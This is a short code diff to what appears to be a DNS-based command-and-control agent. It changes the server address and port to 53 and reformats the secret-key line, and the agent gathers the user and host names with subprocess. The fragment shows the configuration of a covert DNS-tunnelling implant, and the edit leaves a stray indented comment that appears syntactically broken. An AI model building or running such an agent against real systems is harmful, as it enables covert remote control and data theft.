@@ -1,17 +1,16 @@
 import socket
-import base64
 import time
 import subprocess
 from dnslib import DNSRecord, QTYPE, RR, TXT
-import os
 from encrypt import encrypt_message, decrypt_message
 
-DNS_SERVER = "127.0.0.1"  # Change to your server's IP
-DNS_PORT = 9053
+DNS_SERVER = ""  # Change to your server's IP
+DNS_PORT = 53
 POLL_INTERVAL = 2
 MAX_CHUNK_SIZE = 200  # Reduced chunk size to stay within DNS limits
 MAX_OUTPUT_SIZE = 5000  # Limit total output size to 5000 characters
-SECRET_KEY = b'' # Generate a secret with `secrets.token_bytes(32)` and replace it in the agent and server script
+SECRET_KEY = b''
+ # Generate a secret with `secrets.token_bytes(32)` and replace it in the agent and server script
 
 user = subprocess.check_output("whoami", shell=True).decode().strip()
 host = subprocess.check_output("hostname", shell=True).decode().strip()
